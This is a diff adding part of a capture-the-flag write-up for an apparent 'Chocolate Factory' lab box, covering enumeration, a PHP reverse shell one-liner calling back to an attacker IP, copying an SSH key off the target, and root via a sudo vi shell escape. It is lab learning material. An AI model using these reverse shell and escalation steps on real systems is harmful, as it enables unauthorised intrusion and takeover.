@@ -753,3 +753,203 @@ Cost 1 (iteration count) is 5000 for all loaded hashes
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 ```
+
+## Enter the key you found!
+
+While that was running, I reviewed the nmap output and noticed the section about port 113:
+
+```bash
+113/tcp open  ident?
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings:
+|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, NULL, RTSPRequest, TLSSessionReq, TerminalServer, X11Probe, oracle-tns:
+|_    http://localhost/key_rev_key <- You will find the key here!!!
+```
+
+I grabbed the file with wget:
+
+```bash
+$ wget http://target.thm/key_rev_key
+```
+
+I tried to cat that file but it looks like an executable. Instead I ran strings on the file:
+
+```bash
+$ strings key_rev_key
+...
+Enter your name:
+laksdhfas
+ congratulations you have found the key:  
+b'-Vk REDACTED Y='
+```
+
+That is the key the question is looking for.
+
+## Getting a Foothold
+
+Since john still didn't have a hit, I viewing the site and then ran gobuster:
+
+```bash
+$ $ gobuster dir -u http://target.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,zip
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://target.thm
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,txt,zip
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 275]
+/home.php             (Status: 200) [Size: 569]
+/validate.php         (Status: 200) [Size: 93]
+/.php                 (Status: 403) [Size: 275]
+/server-status        (Status: 403) [Size: 275]
+Progress: 830572 / 830576 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+I went to http://target.thm/home.php and saw that I can enter commands and get responses. I start a listener on my attack machine:
+
+```bash
+$ nc -lnvp 4444
+````
+
+I tried a few different ways to get a shell but running with PHP worked:
+
+```bash
+$ php -r '$sock=fsockopen("<attack_machine_ip>",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+```
+
+I have a shell. I'm in!
+
+I get a stable shell by running the commands [found here](/README.md#stable-shell).
+
+## What is Charlie's password?
+
+I see that I can't read the user.txt file at /home/charlie/user.txt. I also noticed an ssh key called teleport in that directory.
+
+I am the www-data user so I go look at the /var/www/html directory. I look at the contents of the files and notice validate.php:
+
+```bash
+$ cat validate.php
+<?php
+	$uname=$_POST['uname'];
+	$password=$_POST['password'];
+	if($uname=="charlie" && $password=="REDACTED"){
+		echo "<script>window.location='home.php'</script>";
+	}
+	else{
+		echo "<script>alert('Incorrect Credentials');</script>";
+		echo "<script>window.location='index.html'</script>";
+	}
+?>
+```
+
+That is charlie's password.
+
+## Change user to charlie
+
+I try to switch to the charlie user with that password but it doesn't work:
+
+```bash
+$ su charlie
+Password: REDACTED
+
+su: Authentication failure
+```
+
+I remembered that charlie's home directory has a teleport file. I am going to transfer that to my attack machine and see if I can ssh into the machine using it. Here is what I ran on the target box:
+
+```bash
+$ cd /home/charlie
+$ python3 -m http.server
+```
+
+Then on my attack machine I ran the following:
+
+```bash
+$ wget http://target.thm:8000/teleport
+$ chmod 600 teleport
+```
+
+Now that I have charlie's password and ssh key I try to log in as charlie:
+
+```bash
+$ ssh charlie@target.thm -i teleport
+```
+
+That worked!
+
+## Enter the user flag
+
+Ironically, the /home/charlie directory is not the home directory. I started at the root directory (/). I run the following commands to get the user.txt file:
+
+```bash
+$ cd /home/charlie
+$ cat user.txt
+REDACTED
+```
+
+## Escalating Privileges
+
+I run my usual [privilege escalation commands](/concepts/privilege_escalation.md#linux-privilege-escalation) and have some luck with `sudo -l`:
+
+```bash
+$ sudo -l
+Matching Defaults entries for charlie on ip-10-10-171-134:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User charlie may run the following commands on ip-10-10-171-134:
+    (ALL : !root) NOPASSWD: /usr/bin/vi
+```
+
+Game over, I can get a shell with vi since it allows users to run shell commands from vi and I can run vi as sudo. I do just that:
+
+```bash
+$ sudo /usr/bin/vi
+```
+
+Then while in vi I run the following:
+
+```bash
+:!/bin/bash
+```
+
+It worked. I'm in! The cursor changed to the # character to let me know that I am root.
+
+## Enter the root flag
+
+I try to get the flag but it is a python script and it doesn't work even when I give it the correct ticket found earlier in the http://target.thm/key_rev_key file:
+
+```bash
+# whoami
+root
+# cd /root
+# ls
+root.py  snap
+# cat root.py
+from cryptography.fernet import Fernet
+import pyfiglet
+key=input("Enter the key:  ")
+f=Fernet(key)
+encrypted_mess= 'REDACTED'
+dcrypt_mess=f.decrypt(encrypted_mess)
+mess=dcrypt_mess.decode()
+display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
+display2=pyfiglet.figlet_format("Chocolate Factory ")
+print(display1)
+print(display2)
+print(mess)
+```
+
+I head to the https://asecuritysite.com/tokens/ferdecode website and enter ticket found in http://target.thm/key_rev_key as the Key. I use the string in the encrypted_mess variable of the root.py file as the Token. It outputs the flag in the Decoded field.
